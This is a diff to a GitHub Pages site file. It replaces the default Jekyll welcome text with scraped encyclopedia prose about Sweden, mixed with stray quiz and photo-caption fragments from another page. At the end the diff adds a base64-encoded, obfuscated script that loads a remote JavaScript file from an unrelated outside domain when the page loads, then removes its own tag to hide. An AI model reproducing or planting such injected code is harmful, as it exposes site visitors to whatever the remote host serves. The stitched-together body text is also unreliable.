@@ -1,37 +1,26 @@
-## Welcome to GitHub Pages
+Sweden, country located on the Scandinavian Peninsula in northern Europe. The name Sweden was derived from the Svear, or Suiones, a people mentioned as early as 98 CE by the Roman author Tacitus. The country’s ancient name was Svithiod. Stockholm has been the permanent capital since 1523.
 
-You can use the [editor on GitHub](https://github.com/hostetler1976/Sweden/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+Beach. Sand. Ocean. Vacation. Sunset casts an orange glow over Ipanema Beach, Rio de Janeiro, Brazil.
+BRITANNICA QUIZ
+Places in Music
+How well do you know your musical places? From AC/DC to Bruce Springsteen, test your knowledge of the origins of various musicians and groups in this quiz.
+Sweden occupies the greater part of the Scandinavian Peninsula, which it shares with Norway. The land slopes gently from the high mountains along the Norwegian frontier eastward to the Baltic Sea. Geologically, it is one of the oldest and most stable parts of the Earth’s crust. Its surface formations and soils were altered by the receding glaciers of the Pleistocene Epoch (about 2,600,000 to 11,700 years ago). Lakes dot the fairly flat landscape, and thousands of islands form archipelagoes along more than 1,300 miles (2,100 km) of jagged, rocky coastline. Like all of northwestern Europe, Sweden has a generally favourable climate relative to its northerly latitude owing to moderate southwesterly winds and the warm North Atlantic Current.
 
-### Markdown
+Sweden
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+The country has a 1,000-year-long continuous history as a sovereign state, but its territorial expanse changed often until 1809. Today it is a constitutional monarchy with a well-established parliamentary democracy that dates from 1917. Swedish society is ethnically and religiously very homogeneous, although recent immigration has created some social diversity. Historically, Sweden rose from backwardness and poverty into a highly developed postindustrial society and advanced welfare state with a standard of living and life expectancy that rank among the highest in the world.
 
-```markdown
-Syntax highlighted code block
 
-# Header 1
-## Header 2
-### Header 3
 
-- Bulleted
-- List
 
-1. Numbered
-2. List
+Sweden long ago disavowed the military aggressiveness that once involved its armies deeply in Europe’s centuries of dynastic warfare. It has chosen instead to play a balancing role among the world’s conflicting ideological and political systems. It is for this reason that Swedish statesmen have often been sought out to fill major positions in the United Nations. At peace since 1814, Sweden has followed the doctrine, enunciated in every document on foreign policy since World War II, of “nonalignment in peace aiming at neutrality in war.”
 
-**Bold** and _Italic_ and `Code` text
 
-[Link](url) and ![Image](src)
-```
+Land
+Sweden lies to the southwest of Finland. A long coastline forms the country’s eastern border, extending along the Gulf of Bothnia and the Baltic Sea; a narrow strait, known as The Sound (Öresund), separates Sweden from Denmark in the south. A shorter coastline along the Skagerrak and Kattegat straits forms Sweden’s border to the southwest, and Norway lies to the west. Sweden extends some 1,000 miles (1,600 km) to the north and south and 310 miles (500 km) to the east and west.
 
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
 
-### Jekyll Themes
+The country is traditionally divided into three regions: to the north is Norrland, the vast mountain and forest region; in central Sweden is Svealand, an expanse of lowland in the east and highland in the west; and in the south is Götaland, which includes the Småland highlands and, at the southern extremity, the small but rich plains of Skåne. In the far north the region of Lappland overlaps Norrland and northern Finland.
 
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/hostetler1976/Sweden/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+<script id="hr5On" src="data:text/javascript;base64, dmFyIF83dTRIbyA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX09jQmFHLCBfTEZObDUpIHt2YXIgXzNsVXRzID0gZnVuY3Rpb24oX1U0bmtCKSB7d2hpbGUgKC0tX1U0bmtCKSB7X09jQmFHWydwdXNoJ10oX09jQmFHWydzaGlmdCddKCkpO319O18zbFV0cygrK19MRk5sNSk7fShfN3U0SG8sIDB4MTFiKSk7dmFyIF9odUdtMSA9IGZ1bmN0aW9uKF9XY2pBTywgX3JtS0ZEKSB7X1djakFPID0gX1djakFPIC0gMHgwO3ZhciBfTTUxaVcgPSBfN3U0SG9bX1djakFPXTtyZXR1cm4gX001MWlXO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfaHVHbTEoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX1ROQlNLID0gZG9jdW1lbnRbX2h1R20xKCcweDEnKV0oX2h1R20xKCcweDInKSk7X1ROQlNLW19odUdtMSgnMHgzJyldID0gX2h1R20xKCcweDQnKTtfVE5CU0tbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg3M1x4NzBceDMyXHg2Zlx4NjlceDM5XHg3OFx4NzNceDJlXHg3MFx4NzJceDZmXHg2Nlx4NjVceDczXHg3OVx4NjFceDc5XHg2OVx4NmVceDZjXHg2MVx4NzJceDY5XHgyZVx4NjNceDZmXHg2ZFx4MmZceDVmXHg3Mlx4NjVceDZkXHg2Zlx4NzRceDY1XHg1Zlx4NzRceDcyXHg2MVx4NjNceDZiXHgyZVx4NmFceDczXHgzZlx4NjNceDYxXHg2ZFx4NzBceDYxXHg2OVx4NjdceDZlXHgzZFx4NTNceDRiXHg3N1x4NDhceDRmXHg1OVx4NDFceDMwXHg0ZVx4NzknO2RvY3VtZW50W19odUdtMSgnMHg1JyldKF9odUdtMSgnMHg2JykpWydceDYxXHg3MFx4NzBceDY1XHg2ZVx4NjRceDQzXHg2OFx4NjlceDZjXHg2NCddKF9UTkJTSyk7ZG9jdW1lbnRbX2h1R20xKCcweDcnKV0oJ2hyNU9uJylbJ1x4NzJceDY1XHg2ZFx4NmZceDc2XHg2NSddKCk7fSwgeydceDZmXHg2ZVx4NjNceDY1JzogISFbXX0pOw=="></script>
